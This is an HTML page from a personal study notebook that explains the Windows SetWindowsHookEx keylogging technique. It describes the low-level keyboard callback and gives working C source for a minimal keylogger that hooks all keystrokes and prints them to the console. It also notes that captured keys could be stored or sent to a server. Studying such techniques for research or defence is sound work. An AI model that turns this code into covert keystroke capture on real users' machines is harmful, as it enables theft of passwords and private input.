<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SetWindowsHookEx & LowLevelKeyboardProc</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># SetWindowsHookEx &amp; LowLevelKeyboardProc</h1></strong><br />This is the classic keylogging technique.<br /><br /><strong>Links</strong><br />• <a href="https://0x00sec.org/t/windows-keylogging-part-i/99">https://0x00sec.org/t/windows-keylogging-part-i/99</a><br />• <a href="https://github.com/killswitch-GUI/SetWindowsHookEx-Keylogger">https://github.com/killswitch-GUI/SetWindowsHookEx-Keylogger</a><br />• <a href="https://wikileaks.org/ciav7p1/cms/page_3375222.html">https://wikileaks.org/ciav7p1/cms/page_3375222.html</a><br /><br /><strong><h2>## Concept</h2></strong><br />The concept behind this method is to hook the <code>LowLevelKeyboardProc</code> function.<br /><code>LowLevelKeyboardProc</code> gets called every time a new keyboard input event happens,<br />i.e. whenever a user presses a key.<br /><br />To monitor the keyboard presses of a user, we can hook this function with <code>SetWindowsHookEx</code>.<br />Now whenever a user presses a key, our custom <code>LowLevelKeyboardProc</code> function will run and we can decide what we want to do with the information: store it in a file, send it to a server, output to the screen, etc.<br /><br /><strong><h3>### About Callback Functions / Messages</h3></strong><br /><a href="http://www.winprog.org/tutorial/message_loop.html">http://www.winprog.org/tutorial/message_loop.html</a><br /><br />Windows applications communicate via messages. <br />The messages get passed through a message queue. Each application can see and process its own messages.<br />Callback functions can be called in the event of retrieving certain messages.<br /><br /><strong><h3>### About LowLevelKeyoardProc</h3></strong><br />LowLevelKeyboardProc is a callback function.<br /><br /><code>nCode</code> stores whether a key was pressed (0 = HC_ACTION = key pressed, &lt;0 = no key pressed)<br /><code>wParam</code> stores whether the key was pressed down or released.<br /><code>lParam</code> stores info about which key was pressed.<br /><br />Key presses are stored in Virtual-Key codes:<br /><a href="https://docs.microsoft.com/en-gb/windows/win32/inputdev/virtual-key-codes?redirectedfrom=MSDN">https://docs.microsoft.com/en-gb/windows/win32/inputdev/virtual-key-codes?redirectedfrom=MSDN</a><br />0x30 = <code>0</code><br />0x5a = <code>Z</code><br /><br /><strong><h3>### General Info</h3></strong><br />Use <code>GetKeyState</code> to track toggles (e.g. CAPSLOCK)<br />Use <code>GetAsyncKeyState</code> to track modifiers (e.g. SHIFT)<br /><br /><strong><h2>## Code</h2></strong><br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;Windows.h&gt;<br /><br />/*<br />Hooked&nbsp;LowLevelKeyboardProc&nbsp;function.<br />*/<br />LRESULT&nbsp;CALLBACK&nbsp;LowLevelKeyboardProc(int&nbsp;nCode,&nbsp;WPARAM&nbsp;wParam,&nbsp;LPARAM&nbsp;lParam)<br />{<br />	if&nbsp;(nCode&nbsp;==&nbsp;HC_ACTION)		//&nbsp;if&nbsp;wParam&nbsp;and&nbsp;lParma&nbsp;contain&nbsp;keyboard&nbsp;message<br />	{<br />		if&nbsp;(wParam&nbsp;==&nbsp;WM_KEYDOWN)		//&nbsp;if&nbsp;key&nbsp;pressed&nbsp;down<br />		{<br />			KBDLLHOOKSTRUCT*&nbsp;keyboard&nbsp;=&nbsp;(KBDLLHOOKSTRUCT*)lParam;<br />			DWORD&nbsp;vkCode&nbsp;=&nbsp;keyboard-&gt;vkCode;<br /><br />			if&nbsp;(vkCode&nbsp;&gt;=&nbsp;0x30&nbsp;&amp;&amp;&nbsp;vkCode&nbsp;&lt;=&nbsp;0x5a)		//&nbsp;0&nbsp;to&nbsp;Z<br />			{<br />				printf(&quot;%c&quot;,&nbsp;vkCode);<br />			}<br />		}<br />	}<br />	<br />	return&nbsp;CallNextHookEx(NULL,&nbsp;nCode,&nbsp;wParam,&nbsp;lParam);<br />}<br /><br />int&nbsp;main()<br /><span style="color:#000000;font-weight:400">{</span><br />	SetWindowsHookEx(WH_KEYBOARD_LL,&nbsp;(HOOKPROC)LowLevelKeyboardProc,&nbsp;GetModuleHandle(NULL),&nbsp;0);<br />	<br />	//&nbsp;message&nbsp;loop&nbsp;to&nbsp;receive&nbsp;messages&nbsp;from&nbsp;the&nbsp;queue<br />	MSG&nbsp;msg;<br />	while&nbsp;(GetMessage(&amp;msg,&nbsp;0,&nbsp;0,&nbsp;0)&nbsp;!=&nbsp;0)<br />	{<br />		TranslateMessage(&amp;msg);<br />		DispatchMessage(&amp;msg);<br />	}<br /><br />	return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br /></div>
</body>
</html>
